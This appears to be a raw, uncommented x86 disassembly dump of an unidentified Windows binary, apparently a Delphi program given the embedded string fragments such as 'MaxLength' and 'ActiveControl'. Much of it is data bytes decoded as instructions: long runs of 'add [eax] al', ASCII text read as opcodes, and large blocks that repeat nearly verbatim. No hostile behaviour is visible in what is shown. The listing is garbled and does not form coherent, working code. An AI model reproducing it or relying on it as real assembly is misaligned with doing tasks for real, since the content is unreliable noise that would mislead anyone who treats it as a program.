add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + esi * 2 ] bh
inc edi
add [ eax + eax ] cl
add [ eax ] al
inc eax
insb
inc edi
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
push 0x6f727245
outsd
outsb
inc ebp
jb r-xdata
inc ebp
outsd
jb r-xdata
inc ebp
jb r-xdata
shr [ eax + 0x4770 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lodsb [ esi ]
jo r-xdata
outsb
jb r-xdata
jb r-xdata
jb r-xdata
insb
arpl [ ebx + 0x73 ] bp
inc ecx
jne r-xdata
ror ah 0x6f
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ebp * 2 + 0x47 ] ch
add [ eax + eax ] cl
add [ eax ] al
inc eax
insb
inc edi
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add ah bl
xor [ esi ] eax
adc [ ebp + 0x49 ] eax
push ebx
outsd
arpl [ ebx + 0x73 ] bp
inc ecx
jne r-xdata
outsd
jb r-xdata
inc ebp
outsd
jb r-xdata
mov eax eax
test al 0x70
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + esi * 2 + 0xc0047 ] ch
rcr [ ecx + esi * 2 ] 0x47
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
jno r-xdata
outsd
jb r-xdata
bound ebp [ ebp + 0x45 ]
add [ eax ] al
inc eax
insb
inc edi
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax + eax ] cl
imul esi [ ebx + 0x53 ] 0x65
jb r-xdata
popad
arpl [ eax + 0x61 ] bp
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add ah bl
xor [ esi ] eax
and [ ebp + 0x49 ] eax
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
cld
inc eax
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ebp * 2 ] al
inc edi
add [ eax + eax ] cl
add [ eax ] al
inc eax
insb
inc edi
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
add [ edi + 0x47 ] ch
jb r-xdata
outsd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ ecx + 0x47 ] dh
nop
jno r-xdata
dec eax
jb r-xdata
jb r-xdata
popad
add [ eax + eax ] cl
add [ eax ] al
inc eax
insb
inc edi
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
jb r-xdata
outsd
inc ebx
jb r-xdata
je r-xdata
jb r-xdata
imul esi [ ebx + 0x73 ] 0x456e6f69
jb r-xdata
sar [ eax + 0x72 ] 0x47
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + esi * 2 + 0x47 ] bh
add [ eax + eax ] cl
add [ eax ] al
inc eax
insb
inc edi
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + esi * 2 + 0xc0047 ] dl
add [ eax ] al
inc eax
insb
inc edi
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ eax ] cl
jb r-xdata
add ah bl
xor [ esi ] eax
and al 0x45
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebx
inc eax
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
push edx
jne r-xdata
push ebp
outsb
jb r-xdata
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc ebp
jb r-xdata
jb r-xdata
inc ebp
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
mov esp 0xc0004041
inc ecx
outsd
jae r-xdata
inc eax
add [ edi + edi + 0x40 ] dl
add ah bl
xor [ esi ] eax
and al [ ebp + 0x49 ]
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
sbb [ edi ] bh
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
inc eax
add ah bl
xor [ esi ] eax
sbb eax 0x53644945
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + esi * 2 ] cl
inc edi
add [ eax + eax ] cl
add [ eax ] al
inc eax
insb
inc edi
jae r-xdata
bound ebp [ ebp + 0x45 ]
popad
arpl [ eax + 0x61 ] bp
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
jb r-xdata
outsd
in al 0x72
add [ eax ] al
outsd
add al al
inc ecx
outsd
insd
insd
popad
outsb
jb r-xdata
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
outsd
outsb
outsb
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
inc ecx
inc eax
add al al
inc ecx
jb r-xdata
jb r-xdata
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add ah bl
xor [ esi ] eax
sbb al [ ebp + 0x49 ]
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
add [ eax + eax ] cl
add [ eax ] al
inc eax
insb
inc edi
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ edi + eax * 2 ] dh
or al 0x0
add [ eax + eax ] cl
add [ eax ] al
insb
sub eax 0x41ac0046
inc eax
jb r-xdata
push eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
jae r-xdata
mov eax eax
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + esi * 2 + 0x47 ] dl
add [ eax + eax ] cl
add [ eax ] al
insb
sub eax 0x41ac0046
inc eax
add [ eax - 0x43ffbfbf ] bh
outsd
inc eax
add [ edi + edi + 0x40 ] dl
add ah bl
xor [ esi ] eax
sbb al [ ebp + 0x49 ]
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
sbb [ edi ] bh
push esp
dec esp
inc ebp
js r-xdata
loope r-xdata
inc edi
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add ah bl
xor [ esi ] eax
pop ds
inc ebp
dec ecx
dec ecx
outsd
dec eax
popad
outsb
insb
jb r-xdata
inc ebx
inc eax
add [ esp + esi * 2 ] bl
inc edi
jae r-xdata
jb r-xdata
add ah bl
xor [ esi ] eax
sbb [ ebp + 0x49 ] eax
dec ebp
popad
js r-xdata
inc eax
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
jb r-xdata
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
popad
jo r-xdata
inc ebp
jb r-xdata
imul esi [ edx + 0x65 ] 0x72724564
fcomp st6
inc ecx
add [ eax ] cl
loop r-xdata
add [ eax + 0x24004041 ] bh
fild [ ecx ]
rol [ ecx + 0x40 ] 0x0
mov ah 0x41
inc eax
add ah bh
inc eax
add [ eax ] bl
aas
inc eax
add al ch
jbe r-xdata
cld
jno r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
je r-xdata
jne r-xdata
push ebx
add [ eax ] al
jo r-xdata
add [ eax + eax ] cl
mov esp 0x4773
dec esp
imul ebp [ esi + 0x65 ] 0x65637845
mov eax eax
jae r-xdata
int3
add [ eax + 0x50 ] dh
inc esi
add [ eax + 0xc00478e ] cl
inc edi
inc edi
add [ edi + eax * 2 + 0x48140047 ] bl
inc edi
add [ eax + edi * 2 + 0x47 ] cl
add [ eax + ecx * 4 + 0x78640047 ] dh
inc edi
add [ eax - 0x47ffb87d ] ah
add [ edi ] 0xffffffdc
ja r-xdata
inc edi
add [ eax + edi * 2 + 0x47 ] ah
add [ esi + ebp * 2 - 0x2213ffbf ] ch
inc ecx
add al cl
insd
inc ecx
add ah al
fiadd [ ecx ]
lodsb [ esi ]
ja r-xdata
inc ecx
add [ eax ] al
loop r-xdata
je r-xdata
imul esi [ edx + 0x65 ] 0x72614c73
push ebx
add ah bl
fiadd [ ecx ]
or dl ah
inc ecx
popad
insd
jae r-xdata
inc ebp
inc edi
add [ eax - 0x6fffb87e ] ch
jge r-xdata
add [ eax + 0x44004032 ] dl
ja r-xdata
inc eax
add [ edi + esi * 2 + 0x47 ] al
add ah dl
fiadd [ ecx ]
int3
rol [ ebx + 0x32900047 ] 0x40
add [ eax - 0x33ffbfce ] dl
jbe r-xdata
add ah ah
fiadd [ ecx ]
add ah bl
xor [ esi ] eax
or al 0x45
dec ecx
dec ecx
outsd
dec eax
popad
outsb
insb
jb r-xdata
inc eax
inc edi
add [ edi ] al
or al 0x54
add al bl
inc edi
add al al
add [ edi ] 0xffffff90
xor al [ eax ]
nop
xor al [ eax ]
inc edi
add [ eax - 0x13ffb872 ] al
mov [ edi ] es
call 0x4847bc97
add [ eax ] bh
je r-xdata
dec ecx
dec ecx
dec edi
dec eax
popad
outsb
insb
jb r-xdata
push esp
add [ eax - 0x7c ] cl
inc edi
add [ eax + 0x74004779 ] cl
jns r-xdata
mov esp 0xb004745
add [ ebx ] cl
dec ecx
dec ecx
add [ ecx + edi * 2 ] cl
inc edi
add [ eax + 0xe004778 ] dl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax - 0x6fffbff0 ] dh
add [ eax ] al
add [ eax - 0x6bffbff0 ] dh
add [ eax ] al
add [ esp + edx * 2 ] cl
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
mov al 0x10
inc eax
add [ eax - 0x50000000 ] dl
adc [ eax ] al
xchg esp eax
jpo r-xdata
add [ ebx + eax * 4 + 0x79a40047 ] bl
inc edi
add [ eax ] bh
add [ edi ] 0x38
dec ecx
dec ecx
dec edi
dec eax
popad
outsb
insb
jb r-xdata
mov al 0x10
inc eax
add [ eax + eax + 0x540c0000 ] dl
jg r-xdata
add [ eax - 0x80 ] ah
inc edi
add [ ebp + ecx * 4 - 0x7823ffb9 ] al
inc edi
add [ edx + ecx * 4 - 0x7d57ffb9 ] cl
inc edi
add [ eax - 0x27ffb883 ] dl
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al 0x0
add al 0x48
outsd
jae r-xdata
dec edi
dec eax
popad
outsb
insb
jb r-xdata
add [ ebp + eax * 2 + 0xb0047 ] bh
or ecx [ ecx + 0x64 ]
dec ecx
add ah al
js r-xdata
dec [ eax ]
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax [ eax ]
or eax [ ebp + 0x73 ]
je r-xdata
add [ eax + 0x40004010 ] dh
add [ eax ] al
ja r-xdata
dec eax
jl r-xdata
cmp al 0x10
inc eax
add [ eax + 0x50ff0000 ] dh
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50040008 ] al
pop eax
arpl [ edi ] ax
pushfd
add [ eax ] al
call [ eax + eax ]
outsb
dec esp
outsb
outsb
popad
je r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49090005 ] al
outsb
je r-xdata
push esp
add [ eax ] al
dec [ ebx - 0x740f7426 ]
cmp al 0x10
inc eax
add al al
outsd
jb r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
or [ eax ] al
add al 0x50
jb r-xdata
jb r-xdata
clc
aaa
inc esi
add [ eax + eax + 0xa4ff00 ] ah
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop es
add [ 0x4c78614d ] cl
imul ebp [ esi + 0x65 ] 0x69746341
outsd
outsb
je r-xdata
outsb
outsd
outsb
mov al 0x10
inc eax
add [ eax + eax + 0x4cff00 ] dl
add dh bh
xor al [ esi ]
jb r-xdata
jo r-xdata
call sub_462560
lea edx [ esi + 0x98 ]
mov eax [ r-xdata ]
call sub_462560
lea edx [ esi + 0xc8 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x6c ]
lea edx [ esi + 0xbc ]
mov eax [ r-xdata ]
imul edi [ edx + 0x65 ] r-xdata
les eax [ eax ]
add bh bh
les eax [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x8000 ] al
or al [ eax ]
push cs
push ebx
outsb
inc edx
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4042d8
add [ eax ] al
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x80
add [ eax ] al
or [ eax ] eax
push cs
push edx
arpl [ gs : esi + 0x42 ] si
jne r-xdata
cmp al 0x10
inc eax
add [ eax - 0x57010000 ] ch
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x40
add [ eax ] al
push es
add [ 0x4c78614d ] cl
imul ebp [ esi + 0x65 ] 0x676e654c
je r-xdata
call sub_47460c
test bl bl
jle r-xdata
rol [ eax - 0x3974031e ] cl
jb r-xdata
mov eax [ r-xdata ]
call sub_462560
mov edx ebx
and dl 0xfc
mov eax esi
enter 0x0 0x0
imul edi [ edx + 0x65 ] 0x8bd88b53
sbb [ eax + eax - 0x3f7b0000 ] 0x74
add eax 0x52ff108b
cmp dh al
sub [ eax + eax + 0x5b000000 ] 0xffffffc3
nop
push ebx
push esi
call sub_404330
mov ebx edx
mov esi eax
sub_47729c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
call 0xc47ba2f
add [ eax ] al
add [ eax + 0x6c ] al
mov eax eax
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ edi + eax * 2 ] dh
or al 0x0
add [ eax + eax ] cl
add [ eax ] al
insb
sub eax 0x41ac0046
inc eax
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
jb r-xdata
loope r-xdata
inc edi
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add ah bl
xor [ esi ] eax
pop ds
inc ebp
dec ecx
dec ecx
outsd
dec eax
popad
outsb
insb
jb r-xdata
inc ebx
inc eax
add [ esp + esi * 2 ] bl
inc edi
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
popad
jo r-xdata
mov esp 0x4773
dec esp
imul ebp [ esi + 0x65 ] 0x65637845
mov eax eax
jae r-xdata
fcomp st6
inc ecx
add [ eax ] cl
loop r-xdata
add [ eax + 0x24004041 ] bh
fild [ ecx ]
rol [ ecx + 0x40 ] 0x0
mov ah 0x41
inc eax
add ah bh
inc eax
add [ eax ] bl
aas
inc eax
add al ch
jbe r-xdata
cld
jno r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
je r-xdata
jne r-xdata
push ebx
add [ eax ] al
jo r-xdata
add [ eax + eax ] cl
jae r-xdata
inc ebp
int3
add [ eax + 0x50 ] dh
inc esi
add [ eax + 0xc00478e ] cl
inc edi
inc edi
add [ edi + eax * 2 + 0x48140047 ] bl
inc edi
add [ eax + edi * 2 + 0x47 ] cl
add [ eax + ecx * 4 + 0x78640047 ] dh
inc edi
add [ eax - 0x47ffb87d ] ah
add [ edi ] 0xffffffdc
ja r-xdata
inc edi
add [ eax + edi * 2 + 0x47 ] ah
add [ esi + ebp * 2 - 0x2213ffbf ] ch
inc ecx
add al cl
insd
inc ecx
add ah al
fiadd [ ecx ]
lodsb [ esi ]
ja r-xdata
inc ecx
add [ eax ] al
loop r-xdata
je r-xdata
imul esi [ edx + 0x65 ] 0x72614c73
push ebx
add ah bl
fiadd [ ecx ]
or dl ah
inc ecx
popad
insd
add ah bl
xor [ esi ] eax
or al 0x45
dec ecx
dec ecx
outsd
dec eax
popad
outsb
insb
jb r-xdata
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
jae r-xdata
add [ eax ] al
outsd
inc edi
add [ eax - 0x6fffb87e ] ch
jge r-xdata
add [ eax + 0x44004032 ] dl
ja r-xdata
inc eax
add [ edi + esi * 2 + 0x47 ] al
add ah dl
fiadd [ ecx ]
int3
rol [ ebx + 0x32900047 ] 0x40
add [ eax - 0x33ffbfce ] dl
jbe r-xdata
add ah ah
fiadd [ ecx ]
jb r-xdata
push eax
inc edi
add [ edi ] al
or al 0x54
add al bl
inc edi
add al al
add [ edi ] 0xffffff90
xor al [ eax ]
nop
xor al [ eax ]
inc edi
add [ eax - 0x13ffb872 ] al
mov [ edi ] es
call 0x4847bc97
jae r-xdata
jb r-xdata
add ah bl
xor [ esi ] eax
sbb [ ebp + 0x49 ] eax
dec ebp
popad
js r-xdata
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + esi * 2 + 0x47 ] dl
add [ eax + eax ] cl
add [ eax ] al
insb
sub eax 0x41ac0046
inc eax
add [ eax - 0x43ffbfbf ] bh
add [ eax ] bh
je r-xdata
dec ecx
dec ecx
dec edi
dec eax
popad
outsb
insb
jb r-xdata
push esp
add [ eax - 0x7c ] cl
inc edi
add [ eax + 0x74004779 ] cl
jns r-xdata
mov esp 0xb004745
add [ ebx ] cl
dec ecx
dec ecx
add [ ecx + edi * 2 ] cl
inc edi
add [ eax + 0xe004778 ] dl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax - 0x6fffbff0 ] dh
add [ eax ] al
add [ eax - 0x6bffbff0 ] dh
add [ eax ] al
add [ esp + edx * 2 ] cl
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
mov al 0x10
inc eax
add [ eax - 0x50000000 ] dl
adc [ eax ] al
xchg esp eax
jpo r-xdata
add [ ebx + eax * 4 + 0x79a40047 ] bl
inc edi
add [ eax ] bh
add [ edi ] 0x38
outsd
in al 0x72
dec ecx
dec ecx
dec edi
dec eax
popad
outsb
insb
jb r-xdata
mov al 0x10
inc eax
add [ eax + eax + 0x540c0000 ] dl
jg r-xdata
add [ eax - 0x80 ] ah
inc edi
add [ ebp + ecx * 4 - 0x7823ffb9 ] al
inc edi
add [ edx + ecx * 4 - 0x7d57ffb9 ] cl
inc edi
add [ eax - 0x27ffb883 ] dl
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al 0x0
add al 0x48
outsd
jae r-xdata
dec edi
dec eax
popad
outsb
insb
jb r-xdata
add [ ebp + eax * 2 + 0xb0047 ] bh
or ecx [ ecx + 0x64 ]
dec ecx
add ah al
js r-xdata
dec [ eax ]
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax [ eax ]
or eax [ ebp + 0x73 ]
je r-xdata
add [ eax + 0x40004010 ] dh
add [ eax ] al
ja r-xdata
dec eax
jl r-xdata
jb r-xdata
sar [ eax + 0x72 ] 0x47
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + esi * 2 + 0x47 ] bh
add [ eax + eax ] cl
add [ eax ] al
inc eax
insb
inc edi
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
jb r-xdata
inc edi
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
add [ eax + eax ] cl
add [ eax ] al
inc eax
insb
cmp al 0x10
inc eax
add [ eax + 0x50ff0000 ] dh
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50040008 ] al
pop eax
arpl [ edi ] ax
pushfd
add [ eax ] al
call [ eax + eax ]
outsb
dec esp
outsb
outsb
popad
je r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49090005 ] al
outsb
je r-xdata
push esp
add [ eax ] al
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
dec [ ebx - 0x740f7426 ]
cmp al 0x10
inc eax
add al al
outsd
jb r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
or [ eax ] al
add al 0x50
jb r-xdata
jb r-xdata
clc
aaa
inc esi
add [ eax + eax + 0xa4ff00 ] ah
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop es
add [ 0x4c78614d ] cl
imul ebp [ esi + 0x65 ] 0x69746341
outsd
outsb
je r-xdata
outsb
outsd
outsb
mov al 0x10
inc eax
add [ eax + eax + 0x4cff00 ] dl
add dh bh
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + esi * 2 + 0xc0047 ] dl
add [ eax ] al
inc eax
insb
inc edi
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add ah bl
xor [ esi ] eax
and al 0x45
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
inc eax
add [ eax ] cl
jb r-xdata
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add ah bl
xor [ esi ] eax
sbb al [ ebp + 0x49 ]
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
add al al
inc ecx
outsd
insd
insd
xor al [ esi ]
jb r-xdata
jo r-xdata
call sub_462560
lea edx [ esi + 0x98 ]
mov eax [ r-xdata ]
call sub_462560
lea edx [ esi + 0xc8 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x6c ]
lea edx [ esi + 0xbc ]
mov eax [ r-xdata ]
imul edi [ edx + 0x65 ] r-xdata
les eax [ eax ]
add bh bh
les eax [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x8000 ] al
or al [ eax ]
push cs
push ebx
outsb
inc edx
jne r-xdata
jb r-xdata
jb r-xdata
inc eax
add ah bl
xor [ esi ] eax
sbb eax 0x53644945
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + esi * 2 ] cl
inc edi
add [ eax + eax ] cl
add [ eax ] al
inc eax
insb
inc edi
outsd
pop esi
pop ebx
retn
mov eax esi
call sub_4042d8
add [ eax ] al
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x80
add [ eax ] al
or [ eax ] eax
push cs
push edx
arpl [ gs : esi + 0x42 ] si
jne r-xdata
cmp al 0x10
inc eax
add [ eax - 0x57010000 ] ch
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x40
add [ eax ] al
push es
add [ 0x4c78614d ] cl
imul ebp [ esi + 0x65 ] 0x676e654c
je r-xdata
call sub_47460c
test bl bl
jle r-xdata
rol [ eax - 0x3974031e ] cl
jb r-xdata
popad
outsb
jb r-xdata
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
